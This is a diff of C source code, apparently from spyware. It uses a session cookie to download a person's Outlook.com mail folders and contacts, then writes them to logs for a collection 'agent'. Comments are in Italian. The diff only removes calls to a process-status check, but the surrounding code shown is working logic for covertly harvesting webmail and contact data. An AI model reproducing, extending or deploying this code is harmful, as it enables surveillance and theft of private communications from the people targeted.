@@ -75,7 +75,6 @@ DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, 
 	char str_date[21];
 	FILETIME ft;
 
-	CheckProcessStatus();
 	
 	_snwprintf_s(url, sizeof(url)/sizeof(WCHAR), _TRUNCATE, L"/mail/InboxLight.aspx?n=1&fid=%S&so=Date&sa=false&fav=false", folder);		
 
@@ -87,7 +86,6 @@ DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, 
 	ret_val = SOCIAL_REQUEST_BAD_COOKIE;
 	parser1 = r_buffer;
 	for (;;) {
-		CheckProcessStatus();
 
 		// Prende l'id del messaggio
 		parser1 = (BYTE *)strstr((char *)parser1, "class=\"ia_hc t_s_hov ml");
@@ -130,7 +128,6 @@ DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, 
 		if (ret_val != SOCIAL_REQUEST_SUCCESS) 
 			break;
 		
-		CheckProcessStatus();
 		// Check sulla dimensione stabilita' nell'agente
 		if (response_len > max_social_mail_len)
 			response_len = max_social_mail_len;
@@ -170,13 +167,11 @@ DWORD ParseOLContacts(char *cookie, char *user_name)
 	WCHAR screen_name[256];
 	WCHAR mail_account[256];
 
-	CheckProcessStatus();
 
 	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", L"/mail/GetContacts.aspx", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 
-	CheckProcessStatus();
 	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
 
 	// Crea il propio account
@@ -222,7 +217,6 @@ DWORD HandleOutlookMail(char *cookie)
 	char *ptr, *ptr2;
 	DWORD last_tstamp_hi, last_tstamp_lo;
 
-	CheckProcessStatus();
 
 	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
